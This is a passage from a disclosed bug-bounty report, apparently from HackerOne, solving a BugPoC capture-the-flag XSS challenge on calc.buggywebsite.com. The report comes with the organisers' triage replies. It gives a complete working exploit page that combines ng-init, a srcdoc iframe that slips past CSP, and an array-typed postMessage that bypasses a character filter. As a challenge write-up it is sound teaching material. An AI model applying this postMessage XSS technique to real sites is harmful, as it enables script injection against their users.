class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisInit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \n        \u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nx\"\u003enum\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003esendEquation\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003enum\u003c/code\u003e value might be anything , it might be\u003ccode\u003ealert(1)\u003c/code\u003e there is no check implemented to make sure it is a digit or not.\u003c/p\u003e\n\n\u003cp\u003eThrough the HTML injection we can use that to achieve XSS like.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-click=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;updateCurrNum(\u0026#39;alert(document.domain);1\u0026#39;)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-click=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;calculate()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut it need the user interaction click, so searched for the \u003ccode\u003edirective components in ng\u003c/code\u003e in the angular js docs and found \u003ccode\u003eng-init\u003c/code\u003e \u003ca title=\"https://docs.angularjs.org/api/ng/directive/ngInit\" href=\"/redirect?url=https%3A%2F%2Fdocs.angularjs.org%2Fapi%2Fng%2Fdirective%2FngInit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.angularjs.org/api/ng/directive/ngInit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThrough which we can call the angular js functions automatically .\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-init=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;updateCurrNum(\u0026#39;alert(document.domain);1\u0026#39;)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-init=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;calculate()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe final payload is to get alert(document.domain)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eng-app=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Calculator\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eng-cloak\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eng-controller=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ArthmeticController\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;container\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-init=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;updateCurrNum(\u0026#39;alert(document.domain);1\u0026#39;)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-init=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;calculate()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOFF\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;angular.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;jquery.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;script.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003etheiframe\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewe need those scripts for the gadget, and CSP allows self scripts so no problem\u003cbr\u003e\nAs the script try to access the iframe object (theiframe), it\u0026#39;s rises as error, to avoid it \u003ccode\u003e\u0026lt;iframe name=theiframe\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWe have to inject that HTML into \u003ccode\u003ecalc.buggywebsite.com\u003c/code\u003e through postMessage.\u003cbr\u003e\nBut the payload contains script tags , script does loads through innerHTML injection, but we can use iframe srcdoc as the scripts are self , even CSP does n\u0026#39;t bothers.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrcdoc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#x3C;div ng-app=\u0026amp;#x22;Calculator\u0026amp;#x22; ng-cloak\u0026amp;#x3E;\u0026amp;#x3C;div ng-controller=\u0026amp;#x22;ArthmeticController\u0026amp;#x22; class=\u0026amp;#x22;container\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;button ng-init=\u0026amp;#x22;updateCurrNum(\u0026amp;#x27;alert(document.domain);1\u0026amp;#x27;)\u0026amp;#x22;\u0026amp;#x3E;OFF\u0026amp;#x3C;/button\u0026amp;#x3E;\u0026amp;#x3C;button ng-init=\u0026amp;#x22;calculate()\u0026amp;#x22;\u0026amp;#x3E;OFF\u0026amp;#x3C;/button\u0026amp;#x3E;\u0026amp;#x3C;/div\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;angular.min.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;jquery.min.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;script.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;iframe name=theiframe\u0026amp;#x3E;\u0026amp;#x3C;/iframe\u0026amp;#x3E;\u0026amp;#x3C;/div\u0026amp;#x3E;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere comes the final issue.\u003cbr\u003e\nOn frame.html before injecting into the HTML there is a last check in frame.js.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe payload must not contains \u0026#39;\u0026amp;\u0026#39; and \u0026#39; , but our payload has \u0026amp;. After trying many things, tried to bypass the check.\u003cbr\u003e\nmsg is nothing but postmessage data. The postMessage data might be anything a string or a list or a object.\u003c/p\u003e\n\n\u003cp\u003eAs if the msg is string it checks char by char, so if it a list then it check index by index.\u003cbr\u003e\nSo tried innerHTML = [\u0026quot;\u0026lt;h1\u0026gt;HTML injection\u0026lt;/h1\u0026gt;\u0026quot;], It worked. so we can bypass the check by using list [\u0026quot;\u0026lt;payload\u0026gt;\u0026quot;].\u003cbr\u003e\nFinal payload is (page must be on calc.buggywebsite.com.\u0026lt;domain.com\u0026gt;)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://calc.buggywebsite.com/frame.html\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;iframe1\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonload=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;runExpliot()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/javascript\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erunExpliot\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eframes\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eiframe1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;iframe srcdoc=\u0026quot;\u0026amp;#x3C;div ng-app=\u0026amp;#x22;Calculator\u0026amp;#x22; ng-cloak\u0026amp;#x3E;\u0026amp;#x3C;div ng-controller=\u0026amp;#x22;ArthmeticController\u0026amp;#x22; class=\u0026amp;#x22;container\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;button ng-init=\u0026amp;#x22;updateCurrNum(\u0026amp;#x27;alert(document.domain);1\u0026amp;#x27;)\u0026amp;#x22;\u0026amp;#x3E;OFF\u0026amp;#x3C;/button\u0026amp;#x3E;\u0026amp;#x3C;button ng-init=\u0026amp;#x22;calculate()\u0026amp;#x22;\u0026amp;#x3E;OFF\u0026amp;#x3C;/button\u0026amp;#x3E;\u0026amp;#x3C;/div\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;angular.min.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;jquery.min.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;script src=\u0026amp;#x22;script.js\u0026amp;#x22;\u0026amp;#x3E;\u0026amp;#x3C;/script\u0026amp;#x3E;\u0026amp;#x3C;iframe name=theiframe\u0026amp;#x3E;\u0026amp;#x3C;/iframe\u0026amp;#x3E;\u0026amp;#x3C;/div\u0026amp;#x3E;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce-proof-on-concept\"\u003eSteps To Reproduce: (Proof on Concept)\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen \u003ca title=\"https://bugpoc.com/poc#bp-u7KS3iYK\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Fpoc%23bp-u7KS3iYK\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/poc#bp-u7KS3iYK\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eUse the password \u003ccode\u003eUSuAlSeaL04\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eRun the POC , there u see\u0026#39;s the pop up of alert(domain)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"note\"\u003eNote :\u003c/h2\u003e\n\n\u003cp\u003eStarted working on the challenge after seeing the mail, tweet (\u003ca title=\"https://twitter.com/bugpoc_official/status/1291767806216765443\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fbugpoc_official%2Fstatus%2F1291767806216765443\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/bugpoc_official/status/1291767806216765443\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) , but lately : (. \u003cbr\u003e\nI know this is too late , most of the people might solved it already. But choose to write an writeup as i have liked this challenge, as i have learned many things in order of solving this. This is my first experience with the angular js : ).\u003cbr\u003e\nThanks for nice challenge , expecting more challenges like this .\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eSolved the challenge and achieved XSS on calc.buggywebsite.com\u003c/p\u003e\n","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-09-14T18:32:15.258Z","allow_singular_disclosure_after":-9117727.184200646,"singular_disclosure_allowed":true,"vote_count":21,"voters":["yxw21","secator","mashoud1122","base_64","mik317","prophet","mygf","1337ibrahim","3x3s","d1r3wolf","and 11 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":51128,"asset_type":"URL","asset_identifier":"*.buggywebsite.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8887953,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for participating in our XSS Challenge! Beautiful writeup! Your solution is correct, however unfortunately the 1st, 2nd, and 3rd place prizes have already been claimed. But do not worry - **your name has been entered into a Raffle to win $100!** 6 random winners will be announced on **August 12th**. Stay tuned- we will re-open and award this submission if you win!\n\nReminder - the best blog write-up about this challenge will win $200! Submit yours on August 12th by tagging @bugpoc_official on Twitter.\n\nI really appreciate you taking the time to document your thought process :)","markdown_message":"\u003cp\u003eThanks for participating in our XSS Challenge! Beautiful writeup! Your solution is correct, however unfortunately the 1st, 2nd, and 3rd place prizes have already been claimed. But do not worry - \u003cstrong\u003eyour name has been entered into a Raffle to win $100!\u003c/strong\u003e 6 random winners will be announced on \u003cstrong\u003eAugust 12th\u003c/strong\u003e. Stay tuned- we will re-open and award this submission if you win!\u003c/p\u003e\n\n\u003cp\u003eReminder - the best blog write-up about this challenge will win $200! Submit yours on August 12th by tagging \u003ca href=\"/bugpoc_official\"\u003e@bugpoc_official\u003c/a\u003e on Twitter.\u003c/p\u003e\n\n\u003cp\u003eI really appreciate you taking the time to document your thought process :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-09T16:11:52.178Z","updated_at":"2020-08-09T16:11:52.178Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"d1r3wolf","url":"/d1r3wolf"},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8916844,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thanks again for participating in our challenge. This CTF was a ton of fun to make and we hope you enjoyed completing it. Unfortunately your solution was not chosen in the random raffle. Stay tuned- we plan on doing another CTF soon! Happy hacking!","markdown_message":"\u003cp\u003eThanks again for participating in our challenge. This CTF was a ton of fun to make and we hope you enjoyed completing it. Unfortunately your solution was not chosen in the random raffle. Stay tuned- we plan on doing another CTF soon! Happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T14:39:51.843Z","updated_at":"2020-08-12T14:39:51.843Z","actor":{"url":"/bugpoc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"BugPoC"}},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8946975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Glad to know that (another CTF) and waiting for it.\nWould you mind allowing disclosure\nThank you","markdown_message":"\u003cp\u003eGlad to know that (another CTF) and waiting for it.\u003cbr\u003e\nWould you mind allowing disclosure\u003cbr\u003e\nThank you\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-15T18:32:15.225Z","updated_at":"2020-08-15T18:32:15.225Z","first_to_agree":true,"actor":{"username":"d1r3wolf","cleared":false,"url":"/d1r3wolf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8946977,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Disclosed!","markdown_message":"\u003cp\u003eDisclosed!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-15T18:32:53.930Z","updated_at":"2020-08-15T18:32:53.930Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8946978,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-15T18:32:54.008Z","updated_at":"2020-08-15T18:32:54.008Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}